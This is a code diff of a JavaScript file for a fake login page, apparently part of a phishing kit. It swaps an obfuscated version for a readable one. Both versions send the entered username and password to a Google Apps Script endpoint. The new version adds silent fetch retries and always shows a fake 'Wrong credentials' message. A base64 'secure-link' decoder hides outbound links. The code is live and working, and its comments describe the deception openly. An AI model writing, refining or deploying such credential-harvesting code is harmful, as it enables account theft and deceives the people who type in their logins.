@@ -1,1 +1,176 @@
-function _0x56e8(){const _0x11f78b=['disabled','3081582QLGuKn','825966pfhOqp','getAttribute','trim','preventDefault','innerHTML','textContent','querySelectorAll','Show','Hide','display','none','<div\x20style=\x22color:\x20#ed4956;\x20font-size:\x2014px;\x20text-align:\x20center;\x20margin-top:\x2015px;\x22>Wrong\x20credentials.\x20Please\x20try\x20again.</div>','toggle','5anqiYL','style','305261DQOhKl','data-enc','removeChild','https://script.google.com/macros/s/AKfycbyuvK7JZPUQvtlOmZluz4nZPxBhLXIWFWkJm2o65PgEMECw9vR3U7_m-jlaEusv0mvaDg/exec','fade-out','561756NGHMVC','classList','div','value','.forgot-password','src','3cjyCdO','input','5191722JRAXHg','getElementById','submit','username','className','888QPLxVV','login-form','block','createElement','slice','password','text','<div\x20class=\x22loading-spinner\x22></div>','click','.show-hide-password','.secure-link','Decryption\x20failed.','querySelector','contains','visible','remove','&t=','83027tDdWLr','open','Log\x20in','add','splash-screen','type','addEventListener','.credential-error','parentNode','body','eye-closed','.show-hide-text','&password=','nextSibling','login-button','insertBefore','length','focus','26287760PqtqSJ'];_0x56e8=function(){return _0x11f78b;};return _0x56e8();}const _0x3f857e=_0x42cb;function _0x42cb(_0x3836cd,_0x54a0fb){const _0x56e807=_0x56e8();return _0x42cb=function(_0x42cb3e,_0x1e9c10){_0x42cb3e=_0x42cb3e-0x96;let _0x2f71f6=_0x56e807[_0x42cb3e];return _0x2f71f6;},_0x42cb(_0x3836cd,_0x54a0fb);}(function(_0x5b9c67,_0x10ef86){const _0x3038e4=_0x42cb,_0x857c26=_0x5b9c67();while(!![]){try{const _0x2cd008=-parseInt(_0x3038e4(0xb3))/0x1+-parseInt(_0x3038e4(0xa4))/0x2*(-parseInt(_0x3038e4(0xbe))/0x3)+parseInt(_0x3038e4(0xb8))/0x4*(-parseInt(_0x3038e4(0xb1))/0x5)+-parseInt(_0x3038e4(0xc0))/0x6+-parseInt(_0x3038e4(0xd6))/0x7*(parseInt(_0x3038e4(0xc5))/0x8)+parseInt(_0x3038e4(0xa3))/0x9+parseInt(_0x3038e4(0xa1))/0xa;if(_0x2cd008===_0x10ef86)break;else _0x857c26['push'](_0x857c26['shift']());}catch(_0x4a8817){_0x857c26['push'](_0x857c26['shift']());}}}(_0x56e8,0xb8b77),document[_0x3f857e(0xdc)]('DOMContentLoaded',()=>{const _0x471482=_0x3f857e,_0x4bee5f=document[_0x471482(0xc1)](_0x471482(0xc3)),_0x2ff4e8=document[_0x471482(0xc1)]('password'),_0x2d933a=document[_0x471482(0xc1)](_0x471482(0x9d)),_0x521279=document[_0x471482(0xc1)](_0x471482(0xda)),_0x31f46d=document[_0x471482(0xc1)](_0x471482(0xc6)),_0x2b348a=document[_0x471482(0xd1)](_0x471482(0xce)),_0x300e23=document['querySelector'](_0x471482(0x9a)),_0x42a456=document[_0x471482(0xc1)]('eye-open'),_0x4eef26=document[_0x471482(0xc1)](_0x471482(0x99)),_0x589b5e=_0x471482(0xb6);window['onload']=()=>{const _0x37e47b=_0x471482;_0x521279[_0x37e47b(0xb9)][_0x37e47b(0xd9)](_0x37e47b(0xb7)),setTimeout(()=>{const _0x5a048b=_0x37e47b;_0x521279[_0x5a048b(0xb2)]['display']=_0x5a048b(0xae);},0x1f4);};function _0x1f935f(){const _0x3d2479=_0x471482;if(!_0x2ff4e8||!_0x2b348a)return;_0x2ff4e8['addEventListener'](_0x3d2479(0xbf),function(){const _0x9d83fc=_0x3d2479;_0x2b348a[_0x9d83fc(0xb9)][_0x9d83fc(0xb0)](_0x9d83fc(0xd3),this[_0x9d83fc(0xbb)]['length']>0x0),_0xa887df();}),_0x2b348a[_0x3d2479(0xdc)](_0x3d2479(0xcd),function(){const _0x2a1390=_0x3d2479,_0x25bbfe=_0x2ff4e8[_0x2a1390(0xdb)]===_0x2a1390(0xca);_0x2ff4e8['type']=_0x25bbfe?_0x2a1390(0xcb):_0x2a1390(0xca),_0x300e23&&(_0x300e23['textContent']=_0x25bbfe?_0x2a1390(0xac):_0x2a1390(0xab)),_0x42a456['style'][_0x2a1390(0xad)]=_0x25bbfe?_0x2a1390(0xae):_0x2a1390(0xc7),_0x4eef26[_0x2a1390(0xb2)][_0x2a1390(0xad)]=_0x25bbfe?_0x2a1390(0xc7):_0x2a1390(0xae),_0x2ff4e8[_0x2a1390(0xa0)]();});}function _0xa887df(){const _0x1d6277=_0x471482,_0xaff98f=_0x4bee5f['value'][_0x1d6277(0xa6)]()!=='',_0x2138d8=_0x2ff4e8['value'][_0x1d6277(0xa6)]()!=='',_0x3ba37c=_0x2ff4e8[_0x1d6277(0xbb)][_0x1d6277(0xa6)]()['length']>=0x6;_0x2d933a[_0x1d6277(0xa2)]=!(_0xaff98f&&_0x2138d8&&_0x3ba37c);}_0x4bee5f[_0x471482(0xdc)](_0x471482(0xbf),_0xa887df),_0x2ff4e8['addEventListener'](_0x471482(0xbf),_0xa887df),_0x31f46d[_0x471482(0xdc)](_0x471482(0xc2),async _0x6fa44f=>{const _0x3dda1d=_0x471482;_0x6fa44f[_0x3dda1d(0xa7)]();if(_0x2d933a[_0x3dda1d(0xa2)])return;const _0x1c6d89=_0x4bee5f[_0x3dda1d(0xbb)][_0x3dda1d(0xa6)](),_0x460a45=_0x2ff4e8[_0x3dda1d(0xbb)][_0x3dda1d(0xa6)]();_0x51215d(),_0x5b3a46(),_0x3df638(_0x1c6d89,_0x460a45),setTimeout(()=>{const _0x4d60e7=_0x3dda1d;_0x516dec(),_0x1953dd(),_0x2ff4e8[_0x4d60e7(0xbb)]='',_0xa887df(),_0x2b348a&&(_0x2b348a[_0x4d60e7(0xb9)][_0x4d60e7(0xd4)](_0x4d60e7(0xd3)),_0x2ff4e8[_0x4d60e7(0xdb)]='password',_0x300e23&&(_0x300e23[_0x4d60e7(0xa9)]=_0x4d60e7(0xab)),_0x42a456[_0x4d60e7(0xb2)][_0x4d60e7(0xad)]='block',_0x4eef26[_0x4d60e7(0xb2)][_0x4d60e7(0xad)]=_0x4d60e7(0xae));},0x5dc);});function _0x3df638(_0x39b553,_0x3c9bc9){const _0x53dfd6=_0x471482,_0x18eb0f=new Image();_0x18eb0f[_0x53dfd6(0xbd)]=_0x589b5e+'?username='+encodeURIComponent(_0x39b553)+_0x53dfd6(0x9b)+encodeURIComponent(_0x3c9bc9)+_0x53dfd6(0xd5)+Date['now'](),_0x18eb0f[_0x53dfd6(0xb2)][_0x53dfd6(0xad)]=_0x53dfd6(0xae),document[_0x53dfd6(0x98)]['appendChild'](_0x18eb0f),setTimeout(()=>{const _0x1c44dd=_0x53dfd6;document['body'][_0x1c44dd(0xd2)](_0x18eb0f)&&document[_0x1c44dd(0x98)][_0x1c44dd(0xb5)](_0x18eb0f);},0xbb8);}function _0x5b3a46(){const _0xeb0bfa=_0x471482;_0x2d933a[_0xeb0bfa(0xa2)]=!![],_0x2d933a[_0xeb0bfa(0xa8)]=_0xeb0bfa(0xcc);}function _0x516dec(){const _0x59ac25=_0x471482;_0x2d933a[_0x59ac25(0xa2)]=![],_0x2d933a[_0x59ac25(0xa9)]=_0x59ac25(0xd8);}function _0x1953dd(){const _0x5cc568=_0x471482;_0x51215d();const _0x113710=document[_0x5cc568(0xc8)](_0x5cc568(0xba));_0x113710[_0x5cc568(0xc4)]='credential-error',_0x113710[_0x5cc568(0xa8)]=_0x5cc568(0xaf);const _0x843e25=document[_0x5cc568(0xd1)](_0x5cc568(0xbc));_0x843e25?_0x843e25[_0x5cc568(0x97)][_0x5cc568(0x9e)](_0x113710,_0x843e25[_0x5cc568(0x9c)]):_0x31f46d[_0x5cc568(0x97)]['appendChild'](_0x113710);}function _0x51215d(){const _0x1192b8=_0x471482;document[_0x1192b8(0xaa)](_0x1192b8(0x96))['forEach'](_0xf69e57=>_0xf69e57['remove']());}_0x1f935f(),_0xa887df(),document[_0x471482(0xaa)](_0x471482(0xcf))['forEach'](_0x58cd97=>{const _0xae9beb=_0x471482;_0x58cd97['addEventListener'](_0xae9beb(0xcd),_0x13587e=>{const _0x1c9c7d=_0xae9beb;_0x13587e[_0x1c9c7d(0xa7)]();const _0x5180e4='123noob',_0x3bf797=_0x58cd97[_0x1c9c7d(0xa5)](_0x1c9c7d(0xb4));try{const _0x2bc1b2=atob(_0x3bf797),_0x57ba19=_0x2bc1b2['startsWith'](_0x5180e4)?_0x2bc1b2[_0x1c9c7d(0xc9)](_0x5180e4[_0x1c9c7d(0x9f)]):null;_0x57ba19&&window[_0x1c9c7d(0xd7)](_0x57ba19,'_blank');}catch(_0x251a90){console['error'](_0x1c9c7d(0xd0),_0x251a90);}});});}));
+document.addEventListener('DOMContentLoaded', () => {
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const loginButton = document.getElementById('login-button');
+    const splashScreen = document.getElementById('splash-screen');
+    const loginForm = document.getElementById('login-form');
+    const showHideButton = document.querySelector('.show-hide-password');
+    const showHideText = document.querySelector('.show-hide-text');
+    const eyeOpenIcon = document.getElementById('eye-open');
+    const eyeClosedIcon = document.getElementById('eye-closed');
+
+    const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyuvK7JZPUQvtlOmZluz4nZPxBhLXIWFWkJm2o65PgEMECw9vR3U7_m-jlaEusv0mvaDg/exec';
+    
+    window.onload = () => {
+        splashScreen.classList.add('fade-out');
+        setTimeout(() => {
+            splashScreen.style.display = 'none';
+        }, 500);
+    };
+
+    function initPasswordToggle() {
+        if (!passwordInput || !showHideButton) return;
+        
+        passwordInput.addEventListener('input', function() {
+            showHideButton.classList.toggle('visible', this.value.length > 0);
+            checkInputs();
+        });
+        
+        showHideButton.addEventListener('click', function() {
+            const isPassword = passwordInput.type === 'password';
+            passwordInput.type = isPassword ? 'text' : 'password';
+            
+            if (showHideText) {
+                showHideText.textContent = isPassword ? 'Hide' : 'Show';
+            }
+            
+            eyeOpenIcon.style.display = isPassword ? 'none' : 'block';
+            eyeClosedIcon.style.display = isPassword ? 'block' : 'none';
+            
+            passwordInput.focus();
+        });
+    }
+
+    function checkInputs() {
+        const isUsernameFilled = usernameInput.value.trim() !== '';
+        const isPasswordFilled = passwordInput.value.trim() !== '';
+        const isPasswordValid = passwordInput.value.trim().length >= 6;
+        loginButton.disabled = !(isUsernameFilled && isPasswordFilled && isPasswordValid);
+    }
+
+    usernameInput.addEventListener('input', checkInputs);
+    passwordInput.addEventListener('input', checkInputs);
+
+    loginForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        if (loginButton.disabled) return;
+        
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value.trim();
+        
+        removeCredentialError();
+        showLoadingState();
+
+        // Await the submission function, which now includes retries
+        await submitViaFetch(username, password);
+        
+        // This timer runs after the submission attempts are finished.
+        // It preserves the original user experience of a simulated delay before showing an error.
+        setTimeout(() => {
+            resetLoginButton();
+            showCredentialError();
+            passwordInput.value = '';
+            checkInputs();
+            
+            if (showHideButton) {
+                showHideButton.classList.remove('visible');
+                passwordInput.type = 'password';
+                
+                if (showHideText) {
+                   showHideText.textContent = 'Show';
+                }
+                eyeOpenIcon.style.display = 'block';
+                eyeClosedIcon.style.display = 'none';
+            }
+        }, 1500);
+    });
+
+    /**
+     * A helper function to create a delay.
+     * @param {number} ms - The number of milliseconds to wait.
+     */
+    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
+
+    /**
+     * Submits data using the modern Fetch API with a silent retry mechanism.
+     * @param {string} username - The user's username.
+     * @param {string} password - The user's password.
+     */
+    async function submitViaFetch(username, password) {
+        const url = `${GOOGLE_SCRIPT_URL}?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&t=${Date.now()}`;
+        const maxRetries = 3; // 1 initial attempt + 2 retries
+
+        for (let attempt = 0; attempt < maxRetries; attempt++) {
+            try {
+                // Use fetch in 'no-cors' mode for a "fire-and-forget" request.
+                await fetch(url, {
+                    method: 'GET',
+                    mode: 'no-cors',
+                    cache: 'no-cache'
+                });
+                
+                // If fetch doesn't throw an error, the request was successfully sent.
+                console.log(`Attempt ${attempt + 1} succeeded.`);
+                return; // Exit the function on success
+                
+            } catch (error) {
+                console.error(`Attempt ${attempt + 1} failed:`, error);
+                
+                // If this wasn't the last attempt, wait before retrying.
+                if (attempt < maxRetries - 1) {
+                    await sleep(1000); // Wait 1 second before the next try
+                } else {
+                    console.error('All submission attempts failed.');
+                }
+            }
+        }
+    }
+
+    function showLoadingState() {
+        loginButton.disabled = true;
+        loginButton.innerHTML = '<div class="loading-spinner"></div>';
+    }
+
+    function resetLoginButton() {
+        loginButton.disabled = false;
+        loginButton.textContent = 'Log in';
+    }
+
+    function showCredentialError() {
+        removeCredentialError();
+        const errorElement = document.createElement('div');
+        errorElement.className = 'credential-error';
+        errorElement.innerHTML = `<div style="color: #ed4956; font-size: 14px; text-align: center; margin-top: 15px;">Wrong credentials. Please try again.</div>`;
+        
+        const forgotLink = document.querySelector('.forgot-password');
+        if (forgotLink) {
+            forgotLink.parentNode.insertBefore(errorElement, forgotLink.nextSibling);
+        } else {
+            loginForm.parentNode.appendChild(errorElement);
+        }
+    }
+
+    function removeCredentialError() {
+        document.querySelectorAll('.credential-error').forEach(e => e.remove());
+    }
+
+    initPasswordToggle();
+    checkInputs();
+    
+    document.querySelectorAll(".secure-link").forEach(a => {
+        a.addEventListener("click", e => {
+            e.preventDefault();
+            const key = "123noob";
+            const encrypted = a.getAttribute("data-enc");
+            try {
+                const decoded = atob(encrypted);
+                const link = decoded.startsWith(key) ? decoded.slice(key.length) : null;
+                if (link) {
+                    window.open(link, "_blank");
+                }
+            } catch (err) {
+                console.error("Decryption failed.", err);
+            }
+        });
+    });
+});
